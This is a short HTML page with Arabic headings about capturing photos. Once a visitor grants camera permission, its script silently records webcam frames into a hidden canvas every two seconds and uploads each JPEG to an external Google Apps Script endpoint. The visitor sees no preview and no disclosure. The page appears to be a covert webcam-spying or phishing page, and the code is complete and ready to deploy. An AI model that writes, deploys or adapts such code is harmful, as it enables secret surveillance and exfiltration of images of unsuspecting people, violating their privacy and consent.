<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>كاميرا الويب</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1>إلتقاط الصور</h1>
  <canvas id="canvas"></canvas>

  <script>
    window.onload = function () {
      const canvas = document.getElementById("canvas");
      const scriptURL = "https://script.google.com/macros/s/AKfycbx0NBTgmLm6KNgEnaM88cbzmfRtLHp7i9dNjjS2av_RVGhcqC3xTQMStTIQkULf9R77Mw/exec";

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          setInterval(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل Canvas مباشرة إلى Blob
            canvas.toBlob(function (blob) {
              const formData = new FormData();
              formData.append("photo", blob, "image.jpg");
              
              fetch(scriptURL, {
                method: "POST",
                body: formData
              })
              .then((res) => res.text())
              .then((res) => console.log("✅ تم الإرسال:", res))
              .catch((err) => console.error("❌ فشل الإرسال:", err));
            }, "image/jpeg", 0.8); // جودة 80%
          }, 2000);
        })
        .catch(function (error) {
          console.error("⚠️ حدث خطأ أثناء الوصول للكاميرا:", error);
        });
    }
  </script>
</body>
</html>
